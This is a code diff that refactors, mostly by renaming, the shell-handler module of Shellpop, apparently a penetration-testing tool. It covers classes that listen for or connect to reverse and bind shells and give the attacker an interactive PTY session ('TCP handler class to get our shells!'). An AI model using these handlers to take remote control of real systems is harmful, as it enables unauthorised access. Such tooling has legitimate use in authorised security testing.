@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
-# PTY, TCP_PTY_Handler classes were extracted from this URL
+# PTY, TcpPtyHandler classes were extracted from this URL
 # https://github.com/infodox/python-pty-shells/blob/master/pty_shell_handler.py
-# This is not officialy code from Shellpop project.
+# This is not official code of "Shellpop" project.
 
 # The other classes, are.
 
@@ -14,6 +14,7 @@ import socket
 import os
 import fcntl
 import sys
+
 
 class PTY:
     def __init__(self, slave=0, pid=os.getpid()):
@@ -65,22 +66,23 @@ class PTY:
         self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
         self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
 
-class TCP_PTY_Handler(object):
-    def __init__(self, addr, bind=True):
-        self.bind = bind
-        self.addr = addr
+
+class TcpPtyHandler(object):
+    def __init__(self, address, is_bind=True):
+        self.bind = is_bind  # boolean to check if it is bind shell.
+        self.address = address
 
         if self.bind:
             self.sock = socket.socket()
-            self.sock.bind(self.addr)
+            self.sock.bind(self.address)
             self.sock.listen(5)
 
-    def handle(self, addr=None):
-        addr = addr or self.addr
+    def handle(self, address=None):
+        address = address or self.address
         if self.bind is True:
             print(info("Waiting for connections ..."))
-            sock, addr = self.sock.accept()
-            print(info("Connection inbound from {0}:{1}".format(self.addr[0], self.addr[1])))
+            sock, address = self.sock.accept()
+            print(info("Connection inbound from {0}:{1}".format(self.address[0], self.address[1])))
         else:
             sock = socket.socket()
             print(info("Waiting up to 10 seconds to start establishing the connection ..."))
@@ -90,7 +92,7 @@ class TCP_PTY_Handler(object):
             n = 0
             while n < 10:
                 try:
-                    sock.connect(addr)
+                    sock.connect(address)
                     print(info("Connection to remote endpoint established."))
                     break
                 except socket.error:
@@ -98,15 +100,15 @@ class TCP_PTY_Handler(object):
                     n += 1
                     sleep(5)
 
-
         # create our PTY
         pty = PTY()
 
         # input buffers for the fd's
         buffers = [ [ sock, [] ], [ pty, [] ] ]
-        def buffer_index(fd):
+
+        def buffer_index(file_descriptor):
             for index, buffer in enumerate(buffers):
-                if buffer[0] == fd:
+                if buffer[0] == file_descriptor:
                     return index
 
         readable_fds = [ sock, pty ]
@@ -146,7 +148,8 @@ class TCP_PTY_Handler(object):
         # close the socket
         sock.close()
 
-class TCP_Handler(object):
+
+class TcpHandler(object):
     """
     TCP handler class to get our shells!
     @zc00l
@@ -218,7 +221,7 @@ class TCP_Handler(object):
             print(error("No connection socket to use."))
             exit(0)
         else:
-            sock.settimeout(1.0)
+            sock.settimeout(0.5)
 
         t = Thread(target=self.read_and_loop, args=(sock,))
         t.start()  # start the read in loop.
@@ -226,18 +229,22 @@ class TCP_Handler(object):
         t2.start()
         t.join()
 
+
 def reverse_tcp_handler(conn_info):
-    handler = TCP_Handler(conn_info, bind=True)
+    handler = TcpHandler(conn_info, bind=True)
     handler.handle()
+
 
 def bind_tcp_handler(conn_info):
-    handler = TCP_Handler(conn_info, bind=False)
+    handler = TcpHandler(conn_info, bind=False)
     handler.handle()
+
 
 def reverse_tcp_pty_handler(conn_info):
-    handler = TCP_PTY_Handler(conn_info, bind=True)
+    handler = TcpPtyHandler(conn_info, is_bind=True)
     handler.handle()
 
+
 def bind_tcp_pty_handler(conn_info):
-    handler = TCP_PTY_Handler(conn_info, bind=False)
+    handler = TcpPtyHandler(conn_info, is_bind=False)
     handler.handle()
